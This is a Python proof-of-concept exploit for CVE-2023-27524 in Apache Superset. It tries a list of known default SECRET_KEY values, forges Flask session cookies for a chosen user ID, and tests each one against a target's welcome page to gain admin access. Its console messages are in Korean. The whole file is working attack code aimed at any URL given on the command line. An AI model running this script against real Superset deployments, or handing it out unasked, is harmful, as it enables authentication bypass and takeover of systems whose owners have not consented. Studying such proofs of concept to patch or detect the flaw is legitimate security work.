# poc.py — CVE-2023-27524 PoC
import requests
import flask_unsign
import argparse

DEFAULT_SECRET_KEYS = [
    "thisISaSECRET_1234",
    "CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET",
    "YOUR_OWN_RANDOM_GENERATED_SECRET",
    "thisISaSECRET",
    "SECRET_KEY"
]

def forge_cookie(user_id, secret_key):
    session_data = {
        "_user_id": str(user_id),
        "_fresh": True,
        "_id": "123"
    }
    return flask_unsign.sign(session_data, secret=secret_key)

def validate_cookie(url, cookie):
    cookies = {'session': cookie}
    try:
        res = requests.get(f"{url}/superset/welcome/", cookies=cookies, timeout=5)
        if "Welcome" in res.text or "Superset" in res.text:
            return True
    except Exception:
        pass
    return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', required=True, help='Target URL (ex. http://localhost:8088)')
    parser.add_argument('--id', required=True, help='Target user ID (ex. 1)')
    parser.add_argument('--validate', action='store_true', help='Try to validate forged cookie')
    args = parser.parse_args()

    for secret_key in DEFAULT_SECRET_KEYS:
        cookie = forge_cookie(args.id, secret_key)
        print(f"[+] 시도 중: SECRET_KEY = '{secret_key}'")
        print(f"    → 세션 쿠키: {cookie}")

        if args.validate:
            if validate_cookie(args.url, cookie):
                print(f"관리자 쿠키 획득")
                print(f"    → session={cookie}")
                return
            else:
                print("   실패")
    print("[-] 세션 위조 실패")

if __name__ == "__main__":
    main()
